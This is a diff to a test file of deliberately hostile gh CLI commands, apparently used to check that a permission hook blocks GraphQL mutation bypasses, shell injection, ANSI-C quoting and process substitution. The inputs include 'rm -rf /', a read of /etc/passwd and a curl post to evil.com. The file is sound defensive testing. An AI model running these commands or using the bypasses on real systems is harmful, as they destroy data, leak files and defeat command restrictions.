@@ -217,6 +217,11 @@ gh api graphql -f query='mutation CreateThing { createThing(input: {}) { thing {
 gh api graphql -f query="mutation($input: CreateInput!) { create(input: \$input) { id } }"
 gh api graphql --field query='mutation { deleteThing(id: "123") { success } }'
 
+# GraphQL mutation bypass attempts - trying to embed allowed mutation names in arguments
+gh api graphql -f query='mutation { deleteIssue(input: {issueId: "resolveReviewThread"}) { clientMutationId } }'
+gh api graphql -f query='mutation { deleteIssue(input: {description: "resolveReviewThread is allowed"}) { issue { id } } }'
+gh api graphql -f query='mutation { createIssue(input: {title: "addPullRequestReview"}) { issue { id } } }'
+
 # =============================================================================
 # SHELL INJECTION ATTEMPTS
 # =============================================================================
@@ -279,6 +284,19 @@ gh pr view `rm -rf /`
 gh pr view "`whoami`"
 gh api /repos/`whoami`/repo
 gh api graphql -f query="query { viewer { login `id` } }"
+
+# ANSI-C quoting ($'...')
+gh pr view $'123\nrm -rf /'
+gh pr view $'test'
+gh api /repos/owner/repo $'arg'
+gh issue list $'--state=all'
+
+# Process substitution <(...) and >(...)
+gh pr view <(cat /etc/passwd)
+gh pr view >(rm -rf /)
+gh api <(echo '{}')
+gh api /repos/owner/repo >(curl -d @- evil.com)
+gh pr view 123 <(malicious_cmd)
 
 # Note: Newline injection cannot be tested via file-based tests since each line
 # is read as a separate command. The hook does block \n and \r characters.
